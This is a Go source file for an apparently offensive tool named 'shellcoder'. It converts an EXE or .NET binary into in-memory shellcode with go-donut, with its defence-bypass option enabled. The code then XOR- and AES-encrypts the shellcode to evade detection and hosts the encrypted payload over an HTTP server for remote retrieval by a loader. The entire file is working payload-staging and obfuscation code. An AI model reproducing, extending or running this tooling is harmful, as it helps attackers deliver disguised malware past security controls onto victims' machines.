package shellcoder

import (
	"bufio"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/Fatake/ShellCodeOfuscator/cipher"

	"github.com/Binject/go-donut/donut"
	"github.com/akamensky/argparse"
	"github.com/fatih/color"

	// Echo es un servidor HTTP en golang
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
)

func Launch() {
	////
	// argument parser
	////
	parser := argparse.NewParser("Generador", "Convert you exe to shellcode.\n\t\t")

	archstring := parser.String("a", "arquitecture",
		&argparse.Options{Required: false, Default: "x84", Help: "Targ x32,x64,x84"})

	dstFile := parser.String("o", "out", &argparse.Options{Required: false,
		Default: "Encrypted.bin", Help: "Output file."})

	srcFile := parser.String("i", "in", &argparse.Options{Required: true,
		Help: ".NET or EXE  execute in-memory."})

	//KEY := parser.String("k", "key", &argparse.Options{Required: false, Default:K, Help: "Insert Key for encryption. or default value. more security random"})
	if err := parser.Parse(os.Args); err != nil || *srcFile == "" {
		log.Println(parser.Usage(err))
		return
	}

	var donutarch donut.DonutArch
	switch strings.ToLower(*archstring) {
	case "x32", "386":
		donutarch = donut.X32

	case "x64", "amd64":
		donutarch = donut.X64

	case "x84":
		donutarch = donut.X84
	default:
		log.Fatal("arquitecture not supported")

	}

	config := new(donut.DonutConfig)
	config.Arch = donutarch
	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Type = donut.DONUT_MODULE_EXE
	config.Bypass = 3
	config.Format = 1
	config.Compress = 1

	EntradaData, err := os.ReadFile(*srcFile)
	if err != nil {
		log.Fatal("Error reading input file")
	}
	color.Blue("[i] Checksum input file: %s", *srcFile)
	md5 := md5.Sum(EntradaData)
	sha1 := sha1.Sum(EntradaData)
	sha256 := sha256.Sum256(EntradaData)

	color.Yellow("[i] md5: %x\n", md5)
	color.Yellow("[i] sha1: %x\n", sha1)
	color.Yellow("[i] sha256: %x\n", sha256)

	payload, err := donut.ShellcodeFromFile(*srcFile, config)
	if err != nil {
		log.Println(err)
	}

	readBuf, _ := io.ReadAll(payload)
	encrypt := cipher.XorEncoder(readBuf, 31)
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	raw2 := cipher.AESEncrypt(encrypt, key, nonce)

	color.Blue("[i] Realizando proceso de cifrado")
	color.Blue("[i] Generando key and Nonce")

	color.Green("[+] key " + base64.StdEncoding.EncodeToString(key))
	color.Green("[+] nonce " + base64.StdEncoding.EncodeToString(nonce))

	err = os.WriteFile(*dstFile, raw2, 0644)
	color.Red("[+] Shellcode generado con exito")

	// Echo HTTP Server
	serverhttp(raw2)

}

func serverhttp(shell []byte) {
	color.Blue("[i] Inicializando Servidor Web")
	// Generamos un midelwware
	echoServer := echo.New()

	echoServer.Use(middleware.LoggerWithConfig(middleware.LoggerConfig{
		Format: "time=${time_rfc3339}, method=${method}, uri=${uri},Ip=${remote_ip}, status=${status}\n",
	}))

	echoServer.GET("/", func(c echo.Context) error {
		return c.String(http.StatusOK, base64.StdEncoding.EncodeToString(shell))
	})

	fmt.Print("[+] insert port -> ")
	scan2 := bufio.NewScanner(os.Stdin)
	scan2.Scan()
	color.Blue("[i] server On")
	echoServer.Logger.Fatal(echoServer.Start(":" + scan2.Text()))
}
